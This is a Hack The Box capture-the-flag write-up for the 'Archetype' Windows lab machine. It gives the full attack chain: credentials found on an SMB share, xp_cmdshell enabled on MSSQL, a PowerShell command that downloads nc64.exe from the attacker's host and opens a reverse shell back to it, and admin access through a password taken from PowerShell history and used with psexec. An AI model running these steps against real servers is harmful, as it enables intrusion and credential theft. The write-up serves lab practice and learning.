# Archetype (Very Easy)
- **IP Address:** '10.129.99.9'
- **OS:** Windows
- **Difficulty:** Very Easy
- **HTB Link:** [Machine Page](https://app.hackthebox.com/machines/archetype)

---

## Enumeration 
### Nmap Scan

```
nmap -sC -sV -p- -T5 -vv 10.129.99.9
```

| Port | Service | Version |
|------|---------|---------|
| 135 | msrpc | Microsoft Windows RPC |
| 139 | netbios-ssn | Microsoft Windows netbios-ssn |
| 445 | microsoft-ds | Windows Server 2019 Standard 17763 microsoft-ds |
| 1433 | ms-sql-s | Microsoft SQL Server 2017 |
| 5985 | http | Microsoft HTTPAPI httpd 2.0 |
| 47001 | http | Microsoft HTTPAPI httpd 2.0 |
| 49664-49669 | msrpc | Microsoft Windows RPC |

### Further Enumeration

I listed the SMB shares and found one named 'backups', and the file contained within had a user and password, ARCHETYPE/sql_svc:M3g4c0rp123

I then connected to the sql database using the creds found with ```impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.99.9```

I did 
```
exec sp_configure 'show advanced options', 1;
reconfigure;
exec sp_configure 'xp_cmdshell', 1;
reconfigure; 
```
to turn on the use of xp_cmdshell, which is a stored procedure in ms sql that can be used to spawn a cmd shell

---

## Exploitation
### Vulnerabiliy Identified

I can use a python webserver to serve nc64.exe to the sql server, and then, using a nc of my own, grab a rev shell

### Exploitation Steps

```
sudo python3 -m http.server 8080
nc -lvnp 443
(on sql) xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.143:8080/nc64.exe -outfile nc64.exe"
(on sql) xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.143 443"

```

### Initial Foothold

After getting the reverse shell, I did a recurse search for files in C:\Users\, and found a user.txt which had the user flag contained.

---

## Privilege Escalation
### PrivEsc Enumeration 

I downloaded winPEASx64.exe and served it to the sql server, and then ran it

Found information:
- C:\Users\Default\NTUSER.DAT
- C:\Users\sql_svc\NTUSER.DAT
- C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\Powershel\PSReadLine\ConsoleHost_history.txt

### Root Exploitation

```
cat C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\Powershell\PSReadLine\ConsoleHost_history.txt
```

This file contained \\Archetype\backups /user:administrator MEGACORP_4dm1n!!

I then used ```impacket-psexec administrator@10.129.99.9``` to connect as admin, and found the root flag in the Admin Desktop

---

### [Flags](https://github.com/TianKwock/htb-flags/blob/main/README.md#archetype)

---

## Lessons Learned

If connected to a sql db, xp_cmdshell is a powerful way to get set up a rev shell

On windows, winPEAS is a great way to find vulns to expoit

Use impacket more and STOP running 'ls' to check if you're in, lest you suffer through reading all of C:\Windows\system32

---

Perceived Difficulty: Not Too Easy 

Time Taken: 1 hr 30 min 

Date PWNED: 4/9/2026 
